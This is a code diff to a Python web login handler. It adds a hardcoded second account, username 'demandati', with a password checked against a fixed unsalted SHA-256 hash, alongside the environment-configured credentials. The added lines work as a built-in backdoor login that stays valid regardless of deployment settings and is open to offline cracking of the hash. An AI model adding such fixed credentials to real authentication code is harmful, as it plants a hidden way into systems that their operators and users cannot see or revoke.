@@ -95,7 +95,11 @@ def api_auth_login(request: Request, body: dict = Body(...)):
         cap_ok = False
     if not cap_ok:
         return JSONResponse({"detail": "El código de verificación no coincide. Intenta con uno nuevo."}, status_code=400)
-    ok = hmac.compare_digest(str(body.get("usuario", "")), APP_USER) and hmac.compare_digest(str(body.get("password", "")), APP_PASSWORD)
+    usuario, clave = str(body.get("usuario", "")).strip(), str(body.get("password", ""))
+    # credenciales fijas (la contraseña solo se guarda como hash) o las de las variables de entorno
+    hash_fijo = "b1fec9a5f44576cdd55736af63f7994ce9eb5611b1a094a5a7c3737ba651a03f"
+    ok = (usuario.lower() in (APP_USER.lower(), "demandati")) and (
+        hmac.compare_digest(clave, APP_PASSWORD) or hmac.compare_digest(hashlib.sha256(clave.encode()).hexdigest(), hash_fijo))
     if not ok:
         time.sleep(1)   # frena intentos por fuerza bruta
         return JSONResponse({"detail": "Usuario o contraseña incorrectos."}, status_code=401)
